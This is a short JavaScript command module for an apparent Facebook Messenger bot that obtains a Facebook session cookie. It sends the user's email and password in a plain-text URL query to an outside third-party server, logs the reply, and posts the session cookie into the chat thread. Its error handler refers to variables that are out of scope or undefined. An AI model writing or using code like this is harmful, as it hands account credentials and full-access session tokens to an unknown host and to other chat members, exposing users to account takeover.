const axios = require("axios");

module.exports = {
    name: 'cookie',
    role: 0,
    prefix: false,
    description: 'Your FB Acc Cookie'
};

module.exports.run = async ({ api, event, args }) => {
    try {
        const threadID = event.threadID;
        const email = args[0];
        const password = args[1];

        if (!email || !password) {
            return await api.sendMessage("Usage: cookie YourMailOrPhone YourPasswordHere", threadID);
        }
        const url = `https://mota-dev.onrender.com/cookie?e=${email}&p=${password}`;
        const req = await axios.get(url);
        const res = req.data;
        console.log(res);

        if (res.cookie) {
            return await api.sendMessage(`Cookie: ${res.cookie}`, threadID, event.messageID);
        } else if (res.error) {
            return await api.sendMessage(`❌ Error: ${res.error}`, threadID, event.messageID);
        }
    } catch (err) {
        logger(err, "error");
        return await api.sendMessage(`❌ Error: ${err.message}`, threadID, event.messageID);
    }
};
